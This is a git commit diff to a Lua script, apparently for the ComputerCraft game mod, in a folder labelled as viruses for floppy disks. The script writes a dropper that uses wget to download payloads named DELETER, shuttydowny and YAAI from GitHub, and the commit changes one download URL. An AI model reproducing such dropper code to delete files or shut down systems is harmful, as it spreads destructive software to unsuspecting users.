3522811f77312d6b5991417fde75fa75a13fc326
Fakedrift <127430703+Faked2378@users.noreply.github.com>
2024-03-24 19:43:59 +0000

    Update adder.lua

--- Virus's (go on floppy disks)/adder.lua
+++ Virus's (go on floppy disks)/adder.lua
@@ -2,7 +2,7 @@ local VF = fs.open("adder.lua", "w")
 local VS = [[
     shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/DELETER.LUA", "disk/DELETER.lua")
     shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/shuttydowny.lua", "disk/shuttydowny.lua")
-    shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/you%20are%20an%20idiot.lua", "disk/YAAI.lua")
+    shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/YAAI.lua", "disk/YAAI.lua")
     term.clear()
 ]] 
 VF.write(VS)
